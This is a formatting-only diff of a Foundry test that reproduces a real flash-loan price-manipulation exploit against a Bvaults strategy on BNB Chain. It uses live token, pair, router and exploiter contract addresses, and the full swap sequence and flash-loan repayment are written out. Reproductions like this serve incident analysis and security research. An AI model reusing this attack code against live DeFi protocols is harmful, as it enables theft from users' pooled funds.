@@ -18,25 +18,17 @@ interface IBvaultsStrategy {
 }
 
 contract ContractTest is Test {
-    IERC20 private constant WBNB =
-        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IERC20 private constant ALPACA =
-        IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
-    IERC20 private constant BUSD =
-        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
-    Uni_Pair_V2 private constant CAKE_WBNB =
-        Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
-    IBvaultsStrategy private constant BvaultsStrategy =
-        IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);
-    address private constant exploitContractAddr =
-        0xe1997bC971D5986AA57Ee8ffB57eb1DeBa4fDAaa;
-    address private constant helperExpContractAddr =
-        0x1ccC8eE8Ad0f70E0Bb362d56035fF241755192b1;
+    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IERC20 private constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
+    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    Uni_Pair_V2 private constant CAKE_WBNB = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
+    IBvaultsStrategy private constant BvaultsStrategy = IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);
+    address private constant exploitContractAddr = 0xe1997bC971D5986AA57Ee8ffB57eb1DeBa4fDAaa;
+    address private constant helperExpContractAddr = 0x1ccC8eE8Ad0f70E0Bb362d56035fF241755192b1;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 34099688);
+        vm.createSelectFork("bsc", 34_099_688);
         vm.label(address(WBNB), "WBNB");
         vm.label(address(ALPACA), "ALPACA");
         vm.label(address(BUSD), "BUSD");
@@ -49,26 +41,17 @@ contract ContractTest is Test {
         deal(address(WBNB), address(this), 0);
         deal(address(BUSD), address(this), 0);
         emit log_named_decimal_uint(
-            "Exploiter amount of BUSD before attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter amount of BUSD before attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
 
         CAKE_WBNB.swap(0, 10_000 * 1e18, address(this), abi.encode(0));
 
         emit log_named_decimal_uint(
-            "Exploiter amount of BUSD after attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter amount of BUSD after attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
     }
 
-    function pancakeCall(
-        address _sender,
-        uint256 _amount0,
-        uint256 _amount1,
-        bytes calldata _data
-    ) external {
+    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
         WBNB.approve(address(Router), type(uint256).max);
         ALPACA.approve(address(Router), type(uint256).max);
         WBNB_ALPACA();
@@ -77,11 +60,7 @@ contract ContractTest is Test {
         ALPACA_WBNB();
         WBNB_BUSD();
         // Here there was a transfer of WBNB amount (for repaying flashloan) from second exploit contract (selfdestructed) to this contract
-        deal(
-            address(WBNB),
-            address(this),
-            WBNB.balanceOf(address(this)) + 10e17
-        );
+        deal(address(WBNB), address(this), WBNB.balanceOf(address(this)) + 10e17);
 
         // Flashloan repay
         uint256 transferAmount = getAmount();
@@ -93,11 +72,7 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(ALPACA);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
@@ -106,11 +81,7 @@ contract ContractTest is Test {
         path[0] = address(ALPACA);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            ALPACA.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            ALPACA.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
@@ -119,20 +90,12 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(BUSD);
         uint256 amountIn = WBNB.balanceOf(address(this)) - getAmount() + 10e17;
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
     }
 
     function getAmount() internal returns (uint256) {
         // Value taken from original, selfdestructed contract. Used in amount calculation
-        uint256 amount = uint256(
-            vm.load(exploitContractAddr, bytes32(uint256(6)))
-        );
-        return ((amount / 9975) * 10000) + 10000;
+        uint256 amount = uint256(vm.load(exploitContractAddr, bytes32(uint256(6))));
+        return ((amount / 9975) * 10_000) + 10_000;
     }
 }
